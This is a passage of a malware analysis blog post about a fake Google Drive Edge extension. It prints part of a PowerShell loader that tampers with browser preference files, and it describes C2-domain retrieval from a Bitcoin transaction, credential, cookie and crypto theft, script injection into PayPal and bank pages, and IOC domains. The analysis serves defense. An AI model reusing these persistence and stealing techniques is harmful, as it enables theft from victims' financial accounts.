+</span></span><span class="line"><span class="cl">                    $JsonContent = $JsonData | ConvertTo-Json -Compress -Depth 100
+</span></span><span class="line"><span class="cl">                    $JsonContent | Out-File -FilePath $SecurePreferencesPath -Encoding UTF8
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    # Additional MSEdge specific modifications
+</span></span><span class="line"><span class="cl">                    if ($BrowserName -eq &#34;msedge&#34;)
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        $PreferencesPath = &#34;$BrowserProfilesDirectory\$($ProfileDirectory.Name)\Preferences&#34;
+</span></span><span class="line"><span class="cl">                        $JsonData = Get-Content -Raw -Path $PreferencesPath -Encoding UTF8 | ConvertFrom-Json
+</span></span><span class="line"><span class="cl">                        $JsonData.extensions = @{ 
+</span></span><span class="line"><span class="cl">                            ui = @{ 
+</span></span><span class="line"><span class="cl">                                dev_mode_warning_snooze_end_time = &#34;99999999999999999&#34; 
+</span></span><span class="line"><span class="cl">                            } 
+</span></span><span class="line"><span class="cl">                        }
+</span></span><span class="line"><span class="cl">                        $JsonContent = $JsonData | ConvertTo-Json -Compress -Depth 100
+</span></span><span class="line"><span class="cl">                        $JsonContent | Out-File -FilePath $PreferencesPath -Encoding UTF8
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    # Restart browser if executable path was found
+</span></span><span class="line"><span class="cl">                    if ($BrowserExecutablePath)
+</span></span><span class="line"><span class="cl">                    {
+</span></span><span class="line"><span class="cl">                        Start-Sleep -Seconds 2
+</span></span><span class="line"><span class="cl">                        Start-Process -FilePath $BrowserExecutablePath
+</span></span><span class="line"><span class="cl">                    }
+</span></span><span class="line"><span class="cl">                }
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="malicious-browser-extension">Malicious Browser Extension</h4>
+<p>Lets execute Microsoft Edge and take a look. The extension tries to masqueraded as a Google Drive extension:</p>
+<img src="/static/Extension/Pasted image 20250524121451.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524124509.png" alt="drawing" width="1000"/>
+<p>Lets take a look on the manifest.json that contains the settings of this extension:</p>
+<img src="/static/Extension/Pasted image 20250524151854.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250524151913.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250530192336.png" alt="drawing" width="1000"/>
+<p>The SubscribeUninstallSimulate.js is the main function of this malware and (as expected) is heavily obfuscated. However, we can identify some very interesting imports and modules:</p>
+<img src="/static/Extension/Pasted image 20250525134612.png" alt="drawing" width="1000"/>
+<h4 id="the-c2-domain-on-a-crypto-transaction">The C2 Domain on a Crypto transaction</h4>
+<p>Let&rsquo;s examine the updateDomain function. It begins very strangely with a cryptocurrency wallet address:</p>
+<img src="/static/Extension/Pasted image 20250530215004.png" alt="drawing" width="1000"/>
+<p>And start checking the transactions made from that wallet in different well know domains.</p>
+<img src="/static/Extension/Pasted image 20250530213839.png" alt="drawing" width="1000"/>
+<p>Let&rsquo;s take a closer look. We can see that it is checking the output of the transaction and appears to decode every scriptPubKey it can find. However, one in particular caught my attention:</p>
+<img src="/static/Extension/Pasted image 20250530213535.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250530213443.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250530221142.png" alt="drawing" width="1000"/>
+<p>Coping the suspicious value and decoding from hex, we have the domain ngc246[.]com. A very interesting method to retrieve a C2 domain address! (This probably exploits Bitcoin&rsquo;s flexibility in script content while bypassing typical validation. The domain persists forever on-chain.)</p>
+<img src="/static/Extension/Pasted image 20250530212738.png" alt="drawing" width="1000"/>
+<p>Let&rsquo;s jump to another core module that is Animate.js and Report.js it seens that it handles all commands sended by the attacker c2</p>
+<img src="/static/Extension/Pasted image 20250530222746.png" alt="drawing" width="1000"/>
+<p>And that&rsquo;s exactly it! We can find numerous functions designed to enumerate and fetch commands, then post their outputs to an API hosted on ngc246[.]com</p>
+<img src="/static/Extension/Pasted image 20250525134554.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250525134715.png" alt="drawing" width="1000"/>
+<p>A summary of its functionalities:</p>
+<p><strong>1. Configuration &amp; Initialization</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>setDomain(domain)</code></td>
+          <td>Sets the C2 server domain</td>
+      </tr>
+      <tr>
+          <td><code>getUUID()</code></td>
+          <td>Retrieves the machine&rsquo;s unique identifier</td>
+      </tr>
+      <tr>
+          <td><code>init()</code></td>
+          <td>Loads the C2 domain from browser storage</td>
+      </tr>
+      <tr>
+          <td><code>getDomain()</code></td>
+          <td>Returns the current C2 domain</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>2. Core Communication function</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>fetch(endpoint, params, method, headers)</code></td>
+          <td><strong>Generic HTTP request handler</strong> (used by all other methods)</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>3. Machine Control &amp; Data Exfiltration</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>initMachine(data)</code></td>
+          <td><strong>Initializes malware</strong> with device info</td>
+      </tr>
+      <tr>
+          <td><code>newGrabberInfo(data)</code></td>
+          <td>Sends stolen data (e.g., credentials, cookies) to C2</td>
+      </tr>
+      <tr>
+          <td><code>setScreenshotResult(ruleId, screenshot)</code></td>
+          <td>Uploads screenshots of victim&rsquo;s active tab</td>
+      </tr>
+      <tr>
+          <td><code>getInjections()</code></td>
+          <td>Fetches malicious scripts to inject into web pages</td>
+      </tr>
+      <tr>
+          <td><code>setFiles(data)</code></td>
+          <td>Exfiltrates stolen files to C2</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>4. Remote Command Execution</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>getCommands()</code></td>
+          <td>Fetches commands from C2</td>
+      </tr>
+      <tr>
+          <td><code>updateCommand(id, answer)</code></td>
+          <td>Sends command results back to C2</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>5. Cryptocurrency Theft (Exchange Targeting)</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>getExchangeSettings()</code></td>
+          <td>Get the config of the withdrawals (Like minimum amount)</td>
+      </tr>
+      <tr>
+          <td><code>createAccount(data)</code></td>
+          <td>Steals exchange account credentials on the creation of a account</td>
+      </tr>
+      <tr>
+          <td><code>setBalance(data)</code></td>
+          <td>Reports balance of user account to C2</td>
+      </tr>
+      <tr>
+          <td><code>setWithdraw(data)</code></td>
+          <td>Report withdrawals to C2</td>
+      </tr>
+      <tr>
+          <td><code>getAddress(data)</code></td>
+          <td>Fetches attacker-controlled crypto addresses</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>6. Persistence &amp; Evasion</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Method</th>
+          <th>Purpose</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>setStealerData(data)</code></td>
+          <td>Exfiltrate to C2 all stolen data</td>
+      </tr>
+      <tr>
+          <td><code>setChecker(data)</code></td>
+          <td>Verifies malware is still active</td>
+      </tr>
+  </tbody>
+</table>
+<p>Report.js creates the handles for each command:</p>
+<p>Command Handlers:
+handleStealer: Processes stealing-related commands (Search and exfiltrate files with seed phrases)
+handleExtension: Manages browser extensions (enable/disable)
+handleInfo: Retrieves system information
+handlePush: Creates browser notifications
+handleCookies: get all browser cookies
+handleScreenshot: Takes screenshots
+handleUrl: Opens URLs
+handleCurrentUrl: Gets current tab URL
+handleHistory: Retrieves browser history
+handleInjects: Manages script injections
+handleSettings: Handles settings
+handleProxy: Get proxy settings
+handleScreenshotRules: Manages screenshot rules</p>
+<p>This malware still has one aspect that makes me curious: what are the injected scripts doing on the pages? Using Developer Tools, we can extract some very interesting data from the malware&rsquo;s configuration - including the C2 domain, reverse proxy address, and each injection script</p>
+<img src="/static/Extension/Pasted image 20250524124740.png" alt="drawing" width="1000"/>
+<p>First, we have the pattern that the malware searches for in the user&rsquo;s accessed pages - targeting financial sites like PayPal, US Bank, Navy Federal, and others</p>
+<img src="/static/Extension/Pasted image 20250524124821.png" alt="drawing" width="1000"/>
+<p>Now lets take a look in the script injected in paypal page:</p>
+<img src="/static/Extension/Pasted image 20250530230129.png" alt="drawing" width="1000"/>
+<p>It first captures the email/password during login and stores them in a custom cookie.</p>
+<img src="/static/Extension/Pasted image 20250530230735.png" alt="drawing" width="1000"/>
+<p>Then extracts PayPal balance, card details, and bank account info.</p>
+<img src="/static/Extension/Pasted image 20250530230838.png" alt="drawing" width="1000"/>
+<p>After that it sents: Balance, cards, banks, credentials and device info to poribax[.]com[/]logs.php</p>
+<img src="/static/Extension/Pasted image 20250530230955.png" alt="drawing" width="1000"/>
+<p>For some injected scripts it was observed sending the exfiltred information to a telegram BOT</p>
+<img src="/static/Extension/Pasted image 20250530231424.png" alt="drawing" width="1000"/>
+<img src="/static/Extension/Pasted image 20250530231536.png" alt="drawing" width="1000"/>
+<h3 id="concluding-thoughts">Concluding Thoughts</h3>
+<p>Creating persistence using a browser extension is very uncommon, but it shows how powerful extensions can be. Using crypto transactions to retrieve the C2 domain was also very creative (and involves a lot of money! =O).</p>
+<p>This analysis was very fun and involved some pretty interesting techniques, highlighting the importance of &ldquo;Stop, Question, Verify, and Repeat.&rdquo;</p>
+<p>Thank you for taking the time to read this analysis! If you have any questions, insights, or suggestions, feel free to reach out.</p>
+<h3 id="iocs">IOCs</h3>
+<ul>
+<li>an[.]disdarrummers[.]shop</li>
+<li>roggiafarm[.]com</li>
+<li>thecsilv[.]com</li>
+<li>rainhadasnoivas[.]com</li>
+<li>hizliadak[.]com</li>
+<li>poribax[.]com</li>
+<li>ngc246[.]com</li>
+<li>95[.]217[.]142[.]33</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-05-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/malicious_extension/" data-title="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/malicious_extension/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/malicious_extension/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/malicious_extension/" data-title="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/malicious_extension/" data-title="Malicious Browser Extension Analysis: MSI installer -&gt; malicious extension -&gt; C2 domain hidden in crypto transactions"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/malicious_extension/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/atm_malware/" class="prev" rel="prev" title="ATM Malware Analysis: Ploutus Malware – Let’s Make This ATM Spit That Cash Out!"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ATM Malware Analysis: Ploutus Malware – Let’s Make This ATM Spit That Cash Out!</a>
+            <a href="/zero2auto_custom/" class="next" rel="next" title="Zero2Auto: Custom Sample">Zero2Auto: Custom Sample<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><h1 id="hack" style="font-size:16px;"></h1><script>let t="HACK THE PLANET",i=0,s=()=>{if(i<t.length){document.getElementById("hack").innerHTML+=t[i];i++;setTimeout(s,100);}};s();</script></div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
